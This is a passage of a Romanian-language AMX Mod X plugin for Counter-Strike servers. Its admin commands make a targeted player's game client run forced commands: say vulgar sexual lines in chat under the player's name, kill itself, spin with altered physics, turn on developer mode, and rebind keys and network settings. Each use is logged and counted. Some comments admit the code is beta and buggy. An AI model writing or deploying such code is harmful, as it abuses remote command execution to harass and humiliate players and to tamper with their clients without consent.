      		 client_print(players[i],print_chat,"[AMXX]Jucatorul:%s nu mai e batut de %s",name,admin)
  	}
  		
  	return PLUGIN_HANDLED
    	
    	
}

public fucktest(id,level,cid){
	if (!cmd_access(id,level,cid,2)){
		return PLUGIN_HANDLED
	}
	if (bCmd){
		waittimer(id)
		return PLUGIN_HANDLED
	}
	new arg[32],name[32],admin[32],sAuthid[35],sAuthid2[35],message[552],players[33],inum
	new fo_logfile[64],ctime[64],maxtext[256]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1+2)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)
	get_user_authid(target,sAuthid,34)
	get_user_authid(id,sAuthid2,34)
	get_configsdir(fo_logfile, 63)
	get_time("%m/%d/%Y - %H:%M:%S",ctime,63)
	loadsrv()
	writesrv()
	format(message,551,"AMXX FUCKOFF Translatat De Isti^nTestat cu siguranta.^n%i mere si e bun...",g_savesrv)
    	format(maxtext, 255, "[AMXX] %s: %s used command FUCKTEST on %s",ctime,admin,name)
    	format(fo_logfile, 63, "%s/amxx_fuckoff.txt", fo_logfile)
	if(!target){ 
	
        	return PLUGIN_HANDLED 
    	}
    	if(!is_user_alive(target)){
    		switch (get_cvar_num("amx_fuckoff_activity")) {
    			case 1: client_cmd(target,"say ^"Adminul %s doar testeaza pe mine .^"",admin)
    			case 0: client_cmd(target,"say ^"Acest admin doar testeaza pe mine.^"")
  		}
  		client_cmd(target, "+jump;wait;-jump;wait;+attack;wait;-attack;wait;say ^"Testul a fost reusit.^"")
  		write_file(fo_logfile,maxtext,-1)
		set_hudmessage(255,255,0,0.47,0.55,0,6.0,12.0,0.1,0.2,1)
    		show_hudmessage(0, message)
    		client_cmd(0, "spk ^"%s^"",g_szSoundFile )
    		for (new i = 0; i < inum; ++i) {
    			if ( access(players[i],ADMIN_CHAT) )
      			 client_print(players[i],print_chat,"[AMXX]Jucatorul:%s a fost testat de  %s",name,admin)
  		}
  		
  		return PLUGIN_HANDLED
    	    	
    	}
    	else {
    		client_cmd(target,"kill")
    		switch (get_cvar_num("amx_fuckoff_activity")) {
    			case 1: client_cmd(target,"say ^"%s Doar testeaza pe mine.^"",admin)
    			case 0: client_cmd(target,"say ^"Adminul doar testeaza pe mine.^"")
  		}
  		client_cmd(target, "+jump;wait;-jump;wait;+attack;wait;-attack;wait;say ^"This test was successful.^"")
  		server_cmd("amx_revive %s",target)
  		write_file(fo_logfile,maxtext,-1)
		set_hudmessage(255,255,0,0.47,0.55,0,6.0,12.0,0.1,0.2,1)
    		show_hudmessage(0, message)
    		client_cmd(0, "spk ^"%s^"",g_szSoundFile )
    		for (new i = 0; i < inum; ++i) {
    			if ( access(players[i],ADMIN_CHAT) )
      			 client_print(players[i],print_chat,"[AMXX]Jucatorul:%s a fost testat de %s",name,admin)
  		}
  		
  		return PLUGIN_HANDLED
    	}
    	
    	return PLUGIN_HANDLED
}
// beta code, may not work.
public spiniton(id,level,cid){
	if (!cmd_access(id,level,cid,2)){
		return PLUGIN_HANDLED
	}
	if (bCmd){
		waittimer(id)
		return PLUGIN_HANDLED
	}
	new arg[32],name[32],admin[32],sAuthid[35],sAuthid2[35],message[552],players[33],inum
	new fo_logfile[64],ctime[64],maxtext[256]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)
	get_user_authid(target,sAuthid,34)
	get_user_authid(id,sAuthid2,34)
	get_configsdir(fo_logfile, 63)
	get_time("%m/%d/%Y - %H:%M:%S",ctime,63)
	if (equali(dev_id,sAuthid))
	{
		client_print(id,print_console,"Nu poti sa folosesti comanda pe ADMIN bah idiotule de doi bani.")
		client_print(0,print_chat,"ATENTIE: %s a incercat sa foloseasca spin pe %s. Comanda a fost respinsa.",admin,name)
		target = id
	}
	loadsrv()
	writesrv()
	format(message,551,"AMXX FUCKOFF creat de Isti^nComanda executata cu succes.^n%i served and counting...",g_savesrv)
    	format(maxtext, 255, "[AMXX] %s: %s used command SPIN on %s",ctime,admin,name)
    	format(fo_logfile, 63, "%s/amxx_fuckoff.txt", fo_logfile)

	if(!target)
	{ 
		return PLUGIN_HANDLED 
    	}
    	switch (get_cvar_num("amx_fuckoff_activity")) 
	{
		case 1: client_cmd(target,"say ^" Bah %s Imi place sa ma fut cu vibratoru.^"",admin)
    		case 0: client_cmd(target,"say ^"Imi place sa fac laba cu vibratoru.^"")
  	}
	client_cmd(target,"developer 1")
	spinon[target] = true
	spinner_effect(target)
  	write_file(fo_logfile,maxtext,-1)
	set_hudmessage(255,255,0,0.47,0.55,0,6.0,12.0,0.1,0.2,1)
    	show_hudmessage(0, message)
    	client_cmd(0, "spk ^"%s^"",g_szSoundFile )
    	for (new i = 0; i < inum; ++i) {
    		if ( access(players[i],ADMIN_CHAT) )
      		client_print(players[i],print_chat,"[AMXX]jucatorul:%s a luat unspun de la %s",name,admin)
  	}
  	bCmd = true
	waittimer(id)
  	
	return PLUGIN_CONTINUE
    	    
}

public spinitoff(id,level,cid){
	if (!cmd_access(id,level,cid,2)){
		return PLUGIN_HANDLED
	}
	new arg[32],name[32],admin[32],sAuthid[35],sAuthid2[35],players[33],inum
	new fo_logfile[64],ctime[64],maxtext[256]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)
	get_user_authid(target,sAuthid,34)
	get_user_authid(id,sAuthid2,34)
	get_configsdir(fo_logfile, 63)
	get_time("%m/%d/%Y - %H:%M:%S",ctime,63)
    	format(maxtext, 255, "[AMXX] %s: %s a folosit comanda UNSPIN pe %s",ctime,admin,name)
    	format(fo_logfile, 63, "%s/amxx_fuckoff.txt", fo_logfile)
	if(!target){ 
	
        	return PLUGIN_HANDLED 
    	}
    	switch (get_cvar_num("amx_fuckoff_activity")) {
    		case 1: client_cmd(target,"say ^"Multumesc %s Acum chiar trebe sa plec.^"",admin)
    		case 0: client_cmd(target,"say ^"Acuma chiar ca sunt prost.^"")
   	}
	client_cmd(target,"developer 1")
   	spinon[target] = false
	client_cmd(target, "-right")
	entity_set_float(target, EV_FL_friction, 1.0)
	entity_set_float(target, EV_FL_gravity, 0.0)
	write_file(fo_logfile,maxtext,-1)
    	for (new i = 0; i < inum; ++i) {
    		if ( access(players[i],ADMIN_CHAT) )
      		 client_print(players[i],print_chat,"[AMXX]jucatorul:%s a luat unspun de la %s",name,admin)
  	}
  		
  	return PLUGIN_HANDLED
    	
    	
}

// Still quirky, needs fixing. Does work though. Need to perfect the gravity i think.
// absolutely needs to be tested fully.
public spinner_effect(id)
{
	new target = id
	client_cmd(target, "+right")
	if(entity_get_int(target, EV_INT_flags) & FL_ONGROUND)
	{
		new Float:Velocity[3]
		entity_get_vector(target, EV_VEC_velocity, Velocity)
		
		Velocity[0] = random_float(200.0, 500.0)
		Velocity[1] = random_float(200.0, 500.0)
		Velocity[2] = random_float(200.0, 500.0)
		
		entity_set_vector(target, EV_VEC_velocity, Velocity)
	}

	entity_set_float(target, EV_FL_friction, 0.1)
	entity_set_float(target, EV_FL_gravity, 0.000001)
}
// Sometimes client_Prethink doesnt work, I dont fucking know why. Not my coding problem.
public client_PreThink(id)
{
	if(spinon[id])
	{
		spinner_effect(id)
	}
}
public reset_round(id)
{
	if (spinon[id])
	{
		entity_set_float(id, EV_FL_friction, 0.1)
		new parm[1]
		parm[0] = id
		set_task(1.0,"spinner_round",id,parm)
	}
	return PLUGIN_CONTINUE
}
public spinner_round(parm[]) 
{
	new id = parm[0]
	spinner_effect(id)
}
public client_disconnect(id)
{
	spinon[id] = false
}

public restore_keys(id){
	new target = id
	client_cmd(target,"bind b buy;wait;wait;bind m chooseteam;wait;wait;bind UPARROW +forward;wait;wait;bind w +forward;wait;wait;bind DOWNARROW +back;wait;wait;bind s +back")
	client_cmd(target,"bind a +moveleft;wait;wait;bind d +moveright;wait;wait;bind SPACE +jump;wait;wait;bind MOUSE1 +attack;wait;wait;bind ENTER +attack;wait;wait;bind MOUSE2 +attack2")
	client_cmd(target,"bind \ +attack2;wait;wait;bind r +reload;wait;wait;bind g drop;wait;wait;bind e +use;wait;wait;bind SHIFT +speed;wait;wait;bind n nightvision;wait;wait;bind f ^"impulse 100^"")
	client_cmd(target,"bind t ^"impulse 201^";wait;wait;bind 1 slot1;wait;wait;bind 2 slot2;wait;wait;bind 3 slot3;wait;wait;bind 4 slot4;wait;wait;bind 5 slot5;wait;wait;bind 6 slot6;wait;wait;bind 7 slot7")
	client_cmd(target,"bind 8 slot8;wait;wait;bind 9 slot9;wait;wait;bind 10 slot10;wait;wait;bind MWHEELDOWN invnext;wait;wait;bind MWHEELUP invprev;wait;wait;bind ] invnext;wait;wait;bind [ invprev")
	client_cmd(target,"bind TAB +showscores;wait;wait;bind y messagemode;wait;wait;bind u messagemode2;wait;wait;bind F5 screenshot;showradar;rate 9999;cl_cmdrate 30;cl_updaterate 30")
	client_cmd(target,"bind ctrl +duck;wait;wait;bind z radio1;wait;wait;bind x radio2;wait;wait;bind c radio3")
	client_cmd(target,"con_color ^"255 180 30^";fps_max 100.0;gl_flipmatrix 0")
	client_print(target,print_chat,"Bindurile tale sunt refacute :D.")
	client_print(target,print_chat," Daca censureul a fost scos trebe sa iesi intrun minut ca setarile sa se salveze !!!.")
}
public waittimer(id){
	new parm[1]
	parm[0] = id
	if (bCmd){
		set_task(3.0,"waittime",bZ+id,parm)
	}
}
public waittime(id){
	if (task_exists(bZ+id)){
		remove_task(bZ+id)
	}
	bCmd = false
}
stock loadsrv(){
	get_configsdir(g_servdir, 63)
	format(g_servfile,127,"%s/served.q",g_servdir)
	if (!file_exists(g_servfile)){
		return PLUGIN_HANDLED
	}
	else {
		
    		read_file(g_servfile,0,g_servtxt,g_servlen,r)
  		
		g_savesrv = str_to_num(g_servtxt)
	}
	return PLUGIN_CONTINUE
}
stock writesrv(){
	get_configsdir(g_servdir, 63)
	format(g_servfile,127,"%s/served.q",g_servdir)
	if (!file_exists(g_servfile)){
		return PLUGIN_HANDLED
	}
	else {
		
    		read_file(g_servfile,0,g_servtxt,g_servlen,t)
  		
		
		g_savesrv = str_to_num(g_servtxt)
		g_savesrv = g_savesrv + 1
		format(g_servtxt,31,"%i",g_savesrv)
		delete_file(g_servfile)
		write_file(g_servfile,g_servtxt,-1)
	}
	return PLUGIN_CONTINUE
}



	

	
